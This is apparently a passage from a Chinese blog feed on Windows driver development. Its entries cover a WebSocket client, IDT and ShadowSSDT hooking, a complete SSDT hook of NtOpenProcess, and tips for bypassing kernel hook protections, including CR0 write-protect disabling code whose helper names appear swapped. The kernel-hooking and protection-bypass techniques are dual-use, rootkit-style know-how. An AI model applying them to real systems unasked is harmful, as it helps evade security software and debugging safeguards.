<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[], TCHAR* envp[])</span><br><span class="line">&#123;</span><br><span class="line">	CString url;</span><br><span class="line">	url.Format(<span class="string">L"ws://127.0.0.1:8888"</span>);</span><br><span class="line">	<span class="keyword">int</span> res = WebSocket(url,recThread,acceptThread,destoryThread);</span><br><span class="line">	<span class="keyword">switch</span>(res)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WEBSOCKET_SUCCESS:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"WebSocket success\n"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WEBSOCKET_URLPARSEERROR:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error %u in WinHttpCrackUrl.\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WEBSOCKET_CONNECTERROR:</span><br><span class="line">		wprintf(<span class="string">L"WinHttpConnect error :%d\n"</span>,GetLastError());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WEBSOCKET_OPENREQUESTERROR:</span><br><span class="line">		wprintf(<span class="string">L"WinHttpOpenRequest error :%d\n"</span>,GetLastError());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WEBSOCKET_SENDREQUESTERROR:</span><br><span class="line">		wprintf(<span class="string">L"WinHttpSendRequest error :%d\n"</span>,GetLastError());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WEBSOCKET_RECVREQUESTERROR:</span><br><span class="line">		wprintf(<span class="string">L"WinHttpReceiveResponse error :%d\n"</span>,GetLastError());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WEBSOCKET_COMPLETEUPGRADEERROR:</span><br><span class="line">		wprintf(<span class="string">L"WinHttpWebSocketCompleteUpgrade error :%d\n"</span>,GetLastError());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		wprintf(<span class="string">L"error\n"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数很简单，就是一个URL地址，然后将我们的三个回调函数传递进去就可以了。<br>WebSocket函数返回代表了WebSocket的状态，可以通过GetLastError获取错误信息。<br>这里的话呢还是有一个功能需要注意的，就是我们有的时候是需要给服务端发消息的，这个你们可以在websocket函数内部进行添加，使用类似的语句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tmpMyWinHttpWebSocketSend(hWebSocket,WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,<span class="string">"wker"</span>,<span class="built_in">strlen</span>(<span class="string">"wker));</span></span><br></pre></td></tr></table></figure>

<p>其实在些这个websocket的时候出现了一个问题，我在文章的顶部写到，是2008年出现的ws，2011年正式的，但是我用的VS是2010的，所以lib库里面根本没有ws的相关函数，并且在<code>winhttp.h</code>中没有定义相关的结构和函数，所以实际上我的VS并不支持我编写websocket的相关功能，所以我不得不自己定义websocket的相关函数，然后从系统的dll文件中拉取ws相关的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MyWinHttpWebSocketCompleteUpgrade tmpWinHttpWebSocketCompleteUpgrade;</span><br><span class="line">MyWinHttpWebSocketReceive tmpMyWinHttpWebSocketReceive;</span><br><span class="line">MyWinHttpWebSocketClose tmpMyWinHttpWebSocketClose;</span><br><span class="line">MyWinHttpWebSocketSend tmpMyWinHttpWebSocketSend;</span><br><span class="line">HMODULE hmodle = LoadLibrary(<span class="string">L"winhttp.dll"</span>);</span><br><span class="line">tmpWinHttpWebSocketCompleteUpgrade = (MyWinHttpWebSocketCompleteUpgrade)GetProcAddress(hmodle,<span class="string">"WinHttpWebSocketCompleteUpgrade"</span>);</span><br><span class="line">tmpMyWinHttpWebSocketReceive = (MyWinHttpWebSocketReceive)GetProcAddress(hmodle,<span class="string">"WinHttpWebSocketReceive"</span>);</span><br><span class="line">tmpMyWinHttpWebSocketClose = (MyWinHttpWebSocketClose)GetProcAddress(hmodle,<span class="string">"WinHttpWebSocketClose"</span>);</span><br><span class="line">tmpMyWinHttpWebSocketSend = (MyWinHttpWebSocketSend)GetProcAddress(hmodle,<span class="string">"WinHttpWebSocketSend"</span>);</span><br></pre></td></tr></table></figure>
<p>如果在高版本的VS中出现重定义的情况，那么就把我在头文件中的定义删除掉，然后将tmpMy的函数替换成他的函数就可以了。<br>winhttp.dll在Windows环境变量目录下，所以直接就可以用。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>sys过Hook保护</title>
    <url>/2020/10/03/sys%E8%BF%87Hook%E4%BF%9D%E6%8A%A4/</url>
    <content><![CDATA[<h2 id="过inline-HOOK技巧"><a href="#过inline-HOOK技巧" class="headerlink" title="过inline HOOK技巧"></a>过inline HOOK技巧</h2><ol>
<li>可以通过对驱动加载前后Nt函数的内容对比，找出关键位置，文本对比工具很多</li>
<li>注意一些不是Nt开头的函数，例如<code>keAttachProcess</code>函数（这个函数实际上是调用了<code>kiAttachProcess</code>函数，所以看看调用出是否挂钩），我们也许要hook还原。</li>
<li><code>KeDebuggerEnable</code>这个和SSDT表一样也是导出的，是一个标志位，1的话呢是可以调试</li>
<li>不要忘记对CR0操作</li>
<li>工具不可完全相信，特别是inline hook</li>
</ol>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>IDT</title>
    <url>/2020/10/02/IDT/</url>
    <content><![CDATA[<h2 id="IDT表"><a href="#IDT表" class="headerlink" title="IDT表"></a>IDT表</h2><p>这个就是中断服务表，例如我们使用int 3软终端，我们就会跳到3这个表指向的内存地址去执行代码：<br><img src="img1.jpg" alt="IDT3"><br>这个中段描述表如果要返回的话呢，我们需要用iretd函数进行返回，这样子就不会处理中断，但是程序却会崩溃。这样子可以避免断点。<br>一般对这个地址进行inline hook。<br>可以起到烦cc断点的效果。</p>
<p>可以使用汇编指令：<code>_asm sidt idtr;</code>将idtr这个变量进行赋值，这个变量是一个结构体对象。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(push, 1)</span></span><br><span class="line"><span class="comment">//从sidt指令获得一个如下的结构，从这里可以得到IDT的开始地址</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">P2C_IDTR_</span> &#123;</span></span><br><span class="line">    P2C_U16        limit; <span class="comment">// 范围</span></span><br><span class="line">    P2C_U32        base; <span class="comment">//基地址</span></span><br><span class="line">&#125;P2C_IDTR, *PP2C_IDTR;</span><br></pre></td></tr></table></figure>
<p>这个base其实是一个结构体的指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(push, 1)</span></span><br><span class="line"><span class="comment">//IDT的内存空间是一个数组。每个元素都有如下的结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">P2C_IDT_ENTRY_</span> &#123;</span></span><br><span class="line">    P2C_U16        offset_low;</span><br><span class="line">    P2C_U16        selector;</span><br><span class="line">    P2C_U8        reserved;</span><br><span class="line">    P2C_U8        type:<span class="number">4</span>;</span><br><span class="line">    P2C_U8        always0:<span class="number">1</span>;</span><br><span class="line">    P2C_U8        dpl:<span class="number">2</span>;</span><br><span class="line">    P2C_U8        present:<span class="number">1</span>;</span><br><span class="line">    P2C_U16        offset_high;</span><br><span class="line">&#125;P2C_IDTENTRY, *PP2C_IDTENTRY;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(pop)</span></span><br></pre></td></tr></table></figure>

<p><code>#pragma pack(push, 1)</code><br>这个的意思就是说压入对齐方式一个字节<br><code>#pragma pack(pop)</code><br>这个意思弹出之前压入的对齐方式</p>
<p>结构体后面的冒号代表占几位，这四个加起来才8位一个字节。</p>
<p>中断和陷阱的区别就是一个是主动的，类似于int，另一个是异常的。</p>
<p>因为我们每个CPU有一个IDT表，所以我们需要修改每一个CPU的IDT表，比较麻烦，我们最好是使用inline hook的方法比较好。</p>
<p>在内联hook的时候最好是用pushad，pushf保存寄存器，最后popf，popad弹出来。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook_ShadowSSDT</title>
    <url>/2020/10/02/Hook-ShadowSSDT/</url>
    <content><![CDATA[<h2 id="ShadowSSDT"><a href="#ShadowSSDT" class="headerlink" title="ShadowSSDT"></a>ShadowSSDT</h2><p>首先使用windbg进行调试，但是我的符号表并没有<code>KeServiceDescriptorTableShadow</code>这个符号，但是我误打误撞发现win7下面的+0x40正好是shadow，哈哈。<br>但是我们发现跟不进去他的基地址，原因是必须要在GDI下面进去，所以我们要下一个内核的消息循环断点，但是我的符号表还是没有NtUserXXX的。<br>我们在读取ShadowSSDT表的时候，不可以在入口函数入口函数读取，因为他并不在GDI中，我们需要在有GDI的程序的线程中进行读取，这个一般是应用程序的IOCL命令下进行读取。<br>hook的话呢和之前一样，或者是直接修改ShadowSSDT数据，不要忘记修改页面保护。</p>
<h2 id="C硬编码"><a href="#C硬编码" class="headerlink" title="C硬编码"></a>C硬编码</h2><p>我们在使用asm内联汇编的时候，如果遇到不识别的汇编指令，我们可以使用<code>_emit 0xf</code>类型设置硬编码，用OD可以看到。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook_SSDT</title>
    <url>/2020/10/01/Hook-SSDT/</url>
    <content><![CDATA[<h2 id="驱动的hook"><a href="#驱动的hook" class="headerlink" title="驱动的hook"></a>驱动的hook</h2><p>相比Win32API的hook，这个貌似更加的流氓一些，其实原理是这样子的（下面的例子用OpenProcess举例），在我们调用OpenProcess函数的时候会调用ZwOpenProcess函数，还是通过汇编代码分析一下吧（随便找个程序进去就行），这样更清楚：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">73975A00 &gt;  8BFF            mov edi,edi                              ; OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">73975A02    55              push ebp</span><br><span class="line">73975A03    8BEC            mov ebp,esp</span><br><span class="line">73975A05    5D              pop ebp                                  ; kernel32.73978494</span><br><span class="line">73975A06  - FF25 F8149E73   jmp dword ptr ds:[&lt;&amp;api-ms-win-core-proc&gt;; KernelBa.OpenProcess</span><br></pre></td></tr></table></figure>
<p>可以看到，我们在jmp之前做了点迷惑操作，具体为什么这么做，不需要了解，但是可以注意到，我们跳转到了<code>KernelBa.OpenProcess</code>里面，我们跟进去：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">754B3C70 &gt;&#x2F;$  8BFF          mov edi,edi                              ;  OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">754B3C72  |.  55            push ebp</span><br><span class="line">754B3C73  |.  8BEC          mov ebp,esp</span><br><span class="line">754B3C75  |.  83EC 24       sub esp,0x24</span><br><span class="line">754B3C78  |.  8B45 10       mov eax,[arg.3]</span><br><span class="line">754B3C7B  |.  33C9          xor ecx,ecx                              ;  OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">754B3C7D  |.  8945 F4       mov [local.3],eax</span><br><span class="line">754B3C80  |.  8B45 0C       mov eax,[arg.2]</span><br><span class="line">754B3C83  |.  F7D8          neg eax</span><br><span class="line">754B3C85  |.  894D F8       mov [local.2],ecx                        ;  OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">754B3C88  |.  C745 DC 18000&gt;mov [local.9],0x18</span><br><span class="line">754B3C8F  |.  1BC0          sbb eax,eax</span><br><span class="line">754B3C91  |.  894D E0       mov [local.8],ecx                        ;  OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">754B3C94  |.  83E0 02       and eax,0x2</span><br><span class="line">754B3C97  |.  894D E4       mov [local.7],ecx                        ;  OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">754B3C9A  |.  8945 E8       mov [local.6],eax</span><br><span class="line">754B3C9D  |.  8D45 F4       lea eax,[local.3]</span><br><span class="line">754B3CA0  |.  50            push eax</span><br><span class="line">754B3CA1  |.  8D45 DC       lea eax,[local.9]</span><br><span class="line">754B3CA4  |.  894D EC       mov [local.5],ecx                        ;  OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">754B3CA7  |.  50            push eax</span><br><span class="line">754B3CA8  |.  FF75 08       push [arg.1]</span><br><span class="line">754B3CAB  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">754B3CAE  |.  894D F0       mov [local.4],ecx                        ;  OpenProc.&lt;ModuleEntryPoint&gt;</span><br><span class="line">754B3CB1  |.  50            push eax</span><br><span class="line">754B3CB2  |.  FF15 70385775 call dword ptr ds:[&lt;&amp;ntdll.NtOpenProcess&gt;;  ntdll.ZwOpenProcess</span><br></pre></td></tr></table></figure>
<p>前面的还是不需要关注，还是最后一句话，call了<code>ntdll.NtOpenProcess</code>，那么我们继续跟进这个<code>ntdll.NtOpenProcess</code>这个函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7707AB30 &gt;  B8 26000000     mov eax,0x26</span><br><span class="line">7707AB35    BA 60F10877     mov edx,ntdll.7708F160</span><br><span class="line">7707AB3A    FFD2            call edx                                 ; OpenProc.&lt;ModuleEntryPoint&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，我们又call了一下edx，然后就返回了，这个edx是多少呢，是0x7708F160，我们继续看这个地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7708F160  - FF25 28B21277   jmp dword ptr ds:[Wow64Transition]       ; wow64cpu.76FA7000</span><br></pre></td></tr></table></figure>
<p>这是最深的一层了，没必要跟进了，其实这个函数通过汇编的分析，可以简单的得到一个结论，就是他需要一个eax的值，在我们调用OpenProcess的时候，这个eax的值是0x26，我截个图大家看看上一层：<br><img src="img6.jpg" alt="eax"><br>发现在上一层有好多类似的代码，都是赋值eax，然后跳到这个Wow64Transition函数中去，这里我讲解的是SSDT，也就是kernel的（不是GDI和user32的）<br>SSDT就是系统服务描述符表，主要作用就是将我们的用户层API与内核层的Nt函数进行一一的对应，里面会存放一个指向这个NT开头函数的地址：<br>说白了就是OpenProcess其实调用了ZwOpenProcess，然后通过eax的值在SSDT表中指向了NtOpenprocess函数，最终调用内核层的代码，Wow64Transition这个函数应该是从用户层跳转的一个函数，这里不做过多的分析。</p>
<p>简单的分析到这里，我们可以画一张图来理顺一下思路（本人画图技术不精，PS一直都是很混）<br><img src="img7.jpg" alt="paint"><br>在之前我们知道用户层的hook分为两种方式，一种是修改PE导入表，另一种是inlinehook，那么这里也主要分为这两种：</p>
<ol>
<li>修改SSDT表的OpenProcess函数的地址，指向我们hook的地址</li>
<li>修改函数的跳转</li>
</ol>
<p>为了简单起见，我主要讲解的是第一种修改SSDT表的方式。</p>
<p>这里我们开发一个hook的驱动程序，我准备的环境是win7,vs2013,wdk,ddk标准的开发环境，虽然有一点点的老了，但是还是可以用的，如果不熟悉搭建环境流程的和我以前学驱动的时候一样的话呢，那么可以联系我，我将这个环境配置到了VM虚拟机中，你只需要下载虚拟机导入就可以直接使用我配置好的环境。</p>
<p>首先我们导入ntddk.h</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>对了还有一点要说的是，我用的是C语言写的，我建议使用C语言，不要用CPP了，CPP写起来我总是遇到问题！！！虽然高级属性少了，但是会避免一些不必要的问题。<br>定义NTOpenProcess的原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(*pfnNtOpenProcess)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	PHANDLE,</span></span></span><br><span class="line"><span class="function"><span class="params">	ACCESS_MASK,</span></span></span><br><span class="line"><span class="function"><span class="params">	POBJECT_ATTRIBUTES,</span></span></span><br><span class="line"><span class="function"><span class="params">	PCLIENT_ID</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br></pre></td></tr></table></figure>
<p>定义一个全局变量，用来保存我们的被hook前真实的NtOpenprocess地址，这里为什么我没用到设备扩展，因为我们不是一个真实的wdm驱动，而是一个测试的nt驱动，为了简单，我就不创建驱动对象了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pfnNtOpenProcess OldNtOpenProcess;</span><br></pre></td></tr></table></figure>

<p>下面是重点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SERVICE_DESCRIPTOR_TABLE</span> &#123;</span></span><br><span class="line">	PVOID 	ServiceTableBase;<span class="comment">//System Service Dispatch Table 的基地址</span></span><br><span class="line">	PVOID 	ServiceCounterTableBase;<span class="comment">//包含着 SSDT 中每个服务被调用次数的计数器。这个计数器一般由sysenter 更新</span></span><br><span class="line">	ULONG	NumberOfServices;<span class="comment">//由 ServiceTableBase 描述的服务的数目</span></span><br><span class="line">	PUCHAR	ParamTableBase;<span class="comment">//包含每个系统服务参数字节数表的基地址-系统服务参数表</span></span><br><span class="line">&#125;SERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE;</span><br><span class="line"></span><br><span class="line">__declspec(dllimport) SERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable;</span><br></pre></td></tr></table></figure>
<p>主要讲解这一块，我们定义SSDT的结构，这个微软给了，我直接copy别人的，下面的是ntoskrnl.lib导出的一个全局变量，这个变量里面就是我们要修改的宏大的SSDT表！</p>
<p>定义我们的NtOpenprocess函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">MyNtOpenProcess</span><span class="params">(PHANDLE ProcessHandle, ACCESS_MASK DesireAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，我什么都不做，只是返回一个连接拒绝，当然我只是为了简单，其实真正的做法应该是我们遍历我们保护的进程，得到PID，然后如果PID等于要保护的话呢我们就返回拒绝，不是我们就让他执行原先的Nt函数。</p>
<p>下面就是hook代码，我参考别人的，我下面简单解释一下他的做法是什么：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">HookSSDTFunction</span><span class="params">(PVOID OldFunction, PVOID HookFuction)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">"Enter HookSSDTFunction \n"</span>));</span><br><span class="line">	PMDL pMdl = MmCreateMdl(<span class="literal">NULL</span>, KeServiceDescriptorTable.ServiceTableBase,KeServiceDescriptorTable.NumberOfServices * <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (!pMdl)</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"Hook SSDT Failed!\n"</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	MmBuildMdlForNonPagedPool(pMdl);</span><br><span class="line">	pMdl-&gt;MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;</span><br><span class="line">	PLONG pMdlLocked = (PLONG)MmMapLockedPages(pMdl, KernelMode);</span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; KeServiceDescriptorTable.NumberOfServices;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((LONG)pMdlLocked[i] == (LONG)OldFunction)</span><br><span class="line">		&#123;</span><br><span class="line">			InterlockedExchange(&amp;pMdlLocked[i], (LONG)HookFuction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	MmUnmapLockedPages(pMdlLocked, pMdl);</span><br><span class="line">	IoFreeMdl(pMdl);</span><br><span class="line">	<span class="keyword">return</span> OldFunction;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们创建一块mdl空间，SSDT表的基地址到SSDT表的结尾，大小的话呢就是SSDT个数的4倍，主要是一个指针四个字节，我们用的32位的操作系统。<br>然后更新我们的MDL空间在非分页内存上，然后再锁住，防止蓝屏这个小可爱。<br>然后遍历SSDT表判断是不是我们要hook的地址，如果是的话呢我们就用这种原子级别的数据交换，修改要hook的函数，最终解锁MDL，并且释放，返回我们之前的函数地址，为了在驱动卸载的时候取消hook。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">hook</span><span class="params">(PCWSTR sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING strToFind;</span><br><span class="line">	RtlInitUnicodeString(&amp;strToFind, sz);</span><br><span class="line">	PVOID AddToFind = MmGetSystemRoutineAddress(&amp;strToFind);</span><br><span class="line">	OldNtOpenProcess = (pfnNtOpenProcess)HookSSDTFunction(NtOpenProcess, MyNtOpenProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码为了验证，但是实际上关键的就是<code>OldNtOpenProcess = (pfnNtOpenProcess)HookSSDTFunction(NtOpenProcess, MyNtOpenProcess);</code>，MmGetSystemRoutineAddress这个函数是通过字符串获得地址，这个也就是XT这种工具可以帮助我们取消hookSSDT表的方法函数。<br>可以看到我们将之前的NtOpenprocess hook 成为了我们的函数。</p>
<p>驱动加载函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> INITCODE</span></span><br><span class="line"><span class="comment">//extern "C" </span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT pDriverObject,</span></span></span><br><span class="line"><span class="function"><span class="params">	IN PUNICODE_STRING pRegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	pDriverObject-&gt;DriverUnload = DriverUnLoad;</span><br><span class="line">	hook(<span class="string">L"NtOpenProcess"</span>);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很简单，驱动一加载我们就hook，也不创建别的东西了。</p>
<p>驱动卸载函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> PAGECODE</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnLoad</span><span class="params">(IN PDRIVER_OBJECT pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HookSSDTFunction(MyNtOpenProcess, OldNtOpenProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也是，卸载的话呢设备对象也不管了，直接取消hook就可以了。</p>
<p>代码其实比较的简单，关键的也就没几行。<br>看一下在32位上实际的操作是什么样子的：<br><img src="img8.jpg" alt="hook"><br>可以看到XT已经检测出来hook了，并且我们现在如果要用管理员方式运行任何东西，都会提示这个样子的对话框：<br><img src="img9.jpg" alt="hook"><br>这个对话框是不是很熟悉，杀毒软件经常这么搞。<br><img src="img10.jpg" alt="unhook"><br>卸载之后XT也就给我们提示了，没有hook了。</p>
<h2 id="过掉驱动"><a href="#过掉驱动" class="headerlink" title="过掉驱动"></a>过掉驱动</h2><p>我们知道原理之后，我们只需要写一个简单的驱动，通过MmGetSystemRoutineAddress函数修改回我们之前的OpenProcess地址就可以了，在这里Wker给大家一些问题以及思路：</p>
<ol>
<li>我们修改回来的话呢，驱动其实可以设置一个DPC的时钟，一直监视我们的NtOpenprocess的地址，如果发现被改回来的话呢还是可以进行设置回来的。<ol>
<li>解决办法：用汇编修改新的NtOpenprocess代码，让他直接跳转到的旧的NtOpenProcess</li>
</ol>
</li>
<li>如果我们用了汇编修改方法，他可以检测这个内存单元的字节，如果存在跳转，并且不是他之前的字节的话呢，他还是可以进行保护</li>
</ol>
<p>留一个问题，希望读者可以通过思考得出如何过掉他的第二种保护手法。</p>
<p>那种内联的hook方法我就不讲了，这个的话呢还要牵扯到一些比较底层的东西，牵扯到CR0的一些问题，给大家一段代码，从网上摘录的，其实也比较简单，就是对CR0的位进行了修改：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//禁用写保护,wp=0</span></span><br><span class="line"><span class="function">VOID <span class="title">PROTECT</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli ;</span><br><span class="line">		mov eax, cr0</span><br><span class="line">		<span class="keyword">and</span>  eax, ~<span class="number">0x10000</span></span><br><span class="line">		mov cr0, eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//启用写保护,wp=1</span></span><br><span class="line"><span class="function">VOID <span class="title">UN_PROTECT</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov  eax, cr0</span><br><span class="line">		<span class="keyword">or</span>     eax, <span class="number">0x10000</span></span><br><span class="line">		mov  cr0, eax</span><br><span class="line">		sti ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动I/O操作</title>
    <url>/2020/09/29/%E9%A9%B1%E5%8A%A8I-O%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="IO操作"><a href="#IO操作" class="headerlink" title="IO操作"></a>IO操作</h2><p>在DOS的时候，确实可以直接使用IN和OUT这两个汇编指令的，但是到了现在只有在内核层才能直接使用汇编指令了。<br>8位的IO输出指令：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">UCHAR <span class="title">IN_8</span> <span class="params">(PUCHAR Port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UCHAR Value;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov edx,Port</span><br><span class="line">		in al,dx</span><br><span class="line">		mov Value,al</span><br><span class="line"></span><br><span class="line">		nop</span><br><span class="line">		nop</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(Value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Out_32</span><span class="params">(PULONG Port,ULONG Value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov edx,Port</span><br><span class="line">		mov eax,Value</span><br><span class="line">		out dx,eax</span><br><span class="line">		nop</span><br><span class="line">		nop</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很简单的操作，注意位数就好，并且用户层不能用。</p>
<h2 id="DDK的IO函数"><a href="#DDK的IO函数" class="headerlink" title="DDK的IO函数"></a>DDK的IO函数</h2><p><img src="img1.jpg" alt="DDK_IO函数"></p>
<p>需要引入<code>HAL.lib</code><br><code>UCHAR Ret8 = READ_PORT_UCHAR((PUCHAROx379)</code></p>
<p>WINIO的函数库，给的是用户层用，但是需要管理员权限，简单的使用：<br><img src="img2.jpg" alt="winio"></p>
<h2 id="DDK操作IO"><a href="#DDK操作IO" class="headerlink" title="DDK操作IO"></a>DDK操作IO</h2><p><img src="img3.jpg" alt="READ"><br>就截图了关键代码段，首先我们获取输入输出的缓冲区，这块可能有点看不懂，但是解释一下就好，我们是规定了他的输入格式的，端口号是一个ULONG类型在最前面（这里需要注意的是InputBuffer++，我觉得是加一，端口号为啥要用四字节的，其实只是为了获取低位罢了，在下面的READ操作中，可以看到我们又强制转换成了其他的，但还是有ULONG类型的），然后就是输出的字节位数，供我们进行判断。<br>其实类似的写入的话呢基本相同，也就是在这个数据格式里面加了一个数据，其实我感觉引入一个结构体会更好一些，不知道作者这么写的目的是什么。</p>
<h2 id="将用户模式下的函数提升到内核模式下"><a href="#将用户模式下的函数提升到内核模式下" class="headerlink" title="将用户模式下的函数提升到内核模式下"></a>将用户模式下的函数提升到内核模式下</h2><p>其实也是很简单的，比较直接的说就是将我们的用户层的函数地址传递给内核层的驱动，然后让驱动执行这个函数，我感觉很实用，想写个类似的工具！放在后面说。</p>
<p>其实还有一个方法在用户层读取IO的方法，就是使用为文档化的Ke386SetIoAccessMap函数，这个函数还需要我们进行声明，这个函数就是设置我们的EFLAGS寄存器的IOPL位，这里不做记录了，貌似现在用不了了。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
